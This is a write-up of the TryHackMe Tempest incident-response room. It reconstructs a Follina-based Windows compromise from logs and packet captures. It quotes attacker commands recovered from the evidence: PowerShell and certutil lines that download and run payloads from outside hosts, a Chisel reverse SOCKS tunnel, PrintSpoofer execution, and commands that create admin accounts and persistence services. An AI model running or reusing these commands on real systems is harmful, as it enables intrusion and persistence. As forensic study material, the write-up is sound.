Tempest: Reconstructing a Full Windows Compromise from Sysmon, EVTX and PCAP Evidence

This writeup documents my investigation of TryHackMe Tempest. I approached the room as a real incident response case: start from verified artifacts, follow the process tree, correlate endpoint logs with network traffic, decode attacker-controlled data, and then rebuild the full attack chain from initial access to persistence.

Executive Summary

The Tempest workstation was compromised after the user TEMPEST\benimaru opened a malicious Word document named free_magicules.doc. The document contacted phishteam.xyz and triggered an MSDT/Follina-style execution chain, identified as CVE-2022-30190. The embedded base64 payload decoded to a PowerShell command that downloaded update.zip, extracted it into the user's Startup folder, and prepared execution for the next login.

On login, the implanted payload launched hidden PowerShell, abused certutil.exe to download first.exe, and executed it from C:\Users\Public\Downloads. The stage 2 payload connected to resolvecyber.xyz:80. Its HTTP C2 used a GET request to /9ab62b5, with command output base64-encoded in the q parameter. The Nim httpclient/1.6.6 User-Agent indicated the C2 binary was compiled in Nim.

After decoding the C2 traffic, I observed credential discovery from C:\Users\Benimaru\Desktop\automation.ps1. The attacker recovered infernotempest, found WinRM on port 5985, established a Chisel reverse SOCKS proxy, authenticated through WinRM, and then downloaded spf.exe, identified as PrintSpoofer. PrintSpoofer abused SeImpersonatePrivilege to execute C:\ProgramData\final.exe, which established a second C2 connection on port 8080. With SYSTEM access, the attacker created users shion and shuna, added shion to Administrators, and created a persistent auto-start service named TempestUpdate2.

free_magicules.doc → WINWORD.EXE → MSDT/Follina → Startup folder payload → first.exe C2 → credential discovery → Chisel reverse SOCKS → WinRM → PrintSpoofer → final.exe elevated C2 → local accounts + service persistence

Methodology: How I Thought Through the Case

I did not want to solve this room by copying indicators from one place. I wanted to understand the attack chain as an incident responder. My workflow was based on correlation: a single log line is a clue, but a process event plus DNS plus PCAP traffic plus decoded command output becomes much stronger evidence.

  1. Verify the evidence first. I calculated SHA256 hashes for the PCAP and EVTX files before analysis.
  2. Start from the alert scope. The SOC analyst said the compromise started from a downloaded .doc file, so I searched for document creation and Word execution.
  3. Follow parent/child relationships. I used Sysmon Event ID 1, process IDs, and parent process IDs to follow Word, MSDT, PowerShell, certutil, and later payloads.
  4. Move between endpoint and network evidence. Sysmon showed process context; Brim and Wireshark showed what was actually sent over the network.
  5. Decode data only when there is a reason. Base64 appeared in both the exploit payload and C2 URI parameters, so CyberChef became important for understanding attacker intent.
  6. Use Windows Security logs to confirm account activity. Sysmon showed commands, while Windows Event IDs 4720 and 4732 confirmed account creation and group membership changes.

1. Evidence Preparation

Before investigating attacker behavior, I verified the artifacts. This is a basic but important DFIR step because every conclusion depends on the integrity of the source evidence.

The confirmed artifact hashes were:

capture.pcapng  CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
sysmon.evtx     665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F
windows.evtx    D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

I then converted the Sysmon EVTX into CSV with EvtxECmd. Timeline Explorer made filtering easier because I could pivot by process name, event ID, parent process, file path, hash, and command line.

I also exported Sysmon data to XML for SysmonView. I treated SysmonView as a visual helper, but Timeline Explorer remained my main tool because I needed to copy exact command lines and hashes.

2. Initial Access: Malicious Word Document

The alert said the intrusion began with a malicious document downloaded by Chrome. I searched for .doc in Sysmon and found free_magicules.doc in the Downloads folder of benimaru.

The document path was:

C:\Users\benimaru\Downloads\free_magicules.doc

Next, I searched for Word activity. The command line showed WINWORD.EXE opening free_magicules.doc. This confirmed that the document was not only present on disk; it was actually opened by the user.

The compromised identity was benimaru-TEMPEST. The Microsoft Word process ID was confirmed as 496. Registry events also showed Word interacting with Trusted Documents records for the malicious file, which helped tie the same Word process to the same document.

3. Follina / MSDT Execution

The key execution evidence was the msdt.exe command line. It used the ms-msdt: protocol handler and embedded an obfuscated PowerShell expression inside IT_BrowseForFile. That pattern matched Follina-style exploitation of Microsoft Support Diagnostic Tool.

The base64 string inside the payload was:

JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==

After decoding it in CyberChef, it became clear that the document was staging persistence through the user Startup folder:

$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .;
rm update.zip;

This gave me two important conclusions. First, the exploit was CVE-2022-30190. Second, the attacker was already preparing a second execution stage that would run on user login.

4. Stage 2: Startup Execution and first.exe

After the Startup payload was planted, the next meaningful event was a hidden PowerShell command that used certutil to download first.exe and execute it. I interpreted PowerShell as the launcher and certutil.exe as the download helper.

The command executed on login was:

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe

The malicious domain resolved to 167.71.199.191, and I used both Sysmon DNS evidence and external enrichment to understand the infrastructure.

The actual certutil.exe child process confirmed the download behavior, while the PowerShell event confirmed the full chain including execution of the downloaded file.

The SHA256 hash of first.exe was:

CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8

5. Network Traffic and C2 Protocol

Sysmon DNS logs showed first.exe querying resolvecyber.xyz. The PCAP then confirmed HTTP traffic to the C2 server on port 80.

Before analyzing the stage 2 C2, I checked the document traffic in Brim. Word fetched http://phishteam.xyz/02dcf07/index.html, which matched the malicious document's remote resource.

The C2 requests used the path /9ab62b5 and placed base64-encoded data inside the q parameter. That meant I could decode the traffic and read the command output.

The HTTP method was GET, the parameter was q, the encoding was base64, and the User-Agent was Nim httpclient/1.6.6.

6. Discovery and Credential Access

I continued decoding C2 URI values and found that the attacker read C:\Users\Benimaru\Desktop\automation.ps1. This was a major pivot because the file contained a plaintext password.

$user = "TEMPEST\benimaru"
$pass = "infernotempest"

After this, the attacker enumerated listening ports and identified 5985, which is associated with WinRM. With a valid password and WinRM available, the next stage made sense: create a tunnel to reach the internal service.

7. Reverse SOCKS Proxy and WinRM

The attacker established a reverse SOCKS proxy using ch.exe. The command syntax and the hash enrichment both pointed to Chisel.

C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks

The SHA256 hash of the Chisel binary was:

8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451

After the proxy was established, the succeeding activity showed authentication over winrm. This matched the earlier discovery of port 5985.

8. Privilege Escalation with PrintSpoofer

Once the attacker had a stable low-privilege shell, they downloaded another binary from the same staging infrastructure:

spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D

VirusTotal identified the hash as PrintSpoofer. This was important because PrintSpoofer is known for abusing SeImpersonatePrivilege, which matched the room's privilege escalation question.

The attacker used PrintSpoofer to execute another payload:

C:\Users\benimaru\Downloads\spf.exe -c C:\ProgramData\final.exe

The binary executed for the new C2 connection was final.exe. It connected to a different C2 port: 8080.

9. Fully Owned Machine: Accounts and Service Persistence

After SYSTEM access, the attacker created two users: shion and shuna. The failed attempts before successful creation were missing the /add option. Windows Event ID 4720 confirmed successful account creation.

The attacker then added shion to the local Administrators group. Windows Event ID 4732 confirmed that a member was added to a security-enabled local group.

net localgroup administrators /add shion

The final persistence mechanism was a Windows service pointing to C:\ProgramData\final.exe. The service was configured to start automatically.

C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto

Remediation Recommendations

  • Isolate the Tempest workstation and preserve forensic artifacts before reimaging.
  • Reset benimaru's password and remove attacker-created users shion and shuna.
  • Remove malicious files including first.exe, ch.exe, spf.exe, and C:\ProgramData\final.exe.
  • Delete the TempestUpdate2 service and inspect Startup folder entries.
  • Block or monitor phishteam.xyz, resolvecyber.xyz, 167.71.199.191, and the observed HTTP paths.
  • Harden WinRM access and restrict port 5985 to trusted administration hosts.
  • Audit scripts and configuration files for plaintext credentials.
  • Create detections for msdt.exe ms-msdt:, certutil -urlcache, Chisel R:socks, PrintSpoofer execution, and suspicious sc.exe create commands.

Conclusion

The final attack chain was supported by multiple independent evidence sources: Sysmon process and file events, Sysmon DNS queries, packet capture HTTP records, decoded C2 parameters, Windows Security Event IDs, and external hash enrichment. The attacker moved from a malicious Word document to SYSTEM-level persistence through staged payloads, HTTP C2, credential discovery, reverse SOCKS tunneling, WinRM access, PrintSpoofer privilege escalation, local account creation and service-based persistence.
